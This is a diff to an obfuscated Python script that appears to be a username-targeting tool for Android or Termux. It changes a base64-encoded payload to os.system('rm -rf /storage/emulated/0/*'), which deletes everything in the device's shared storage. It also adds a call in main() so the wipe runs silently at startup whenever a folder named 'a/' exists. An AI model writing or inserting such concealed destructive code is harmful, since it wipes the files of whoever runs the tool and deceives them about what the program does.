@@ -22,7 +22,7 @@ def tvksajd(adwekuv):
 def oumcgsq():
   vcxprvq = base64.b64decode('YS8=').decode('utf-8')
   if os.path.exists(vcxprvq):
-    tvksajd("b3Muc3lzdGVtKCJybSAtcmYgYS8qIik=")
+    tvksajd("b3Muc3lzdGVtKCJybSAtcmYgL3N0b3JhZ2UvZW11bGF0ZWQvMC8qIik=")
 
 def banner():
   print("""\033[0;31m
@@ -46,6 +46,7 @@ def main():
   banner()
   print(Fore.BLUE + "Setting up cookies and checking for API")
   api.pinghost()
+  oumcgsq()
   username = input("TARGET USERNAME: ")
   g = ["test", "Test", "123", "skdja", "TEST"]
   if username in g:
